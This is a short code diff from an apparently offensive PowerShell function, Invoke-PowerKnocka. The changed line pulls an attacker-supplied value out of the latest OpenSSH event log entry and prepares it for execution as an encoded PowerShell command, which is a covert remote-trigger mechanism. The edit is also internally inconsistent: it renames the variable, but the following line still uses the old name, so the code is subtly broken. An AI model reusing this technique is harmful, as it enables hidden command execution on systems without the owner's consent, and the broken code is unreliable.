@@ -41,7 +41,7 @@ function Invoke-PowerKnocka {
     }
 
     if ($SSH) {
-        $ExploitString = '((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
+        $SSHString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
     }
 
     $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ExploitString)
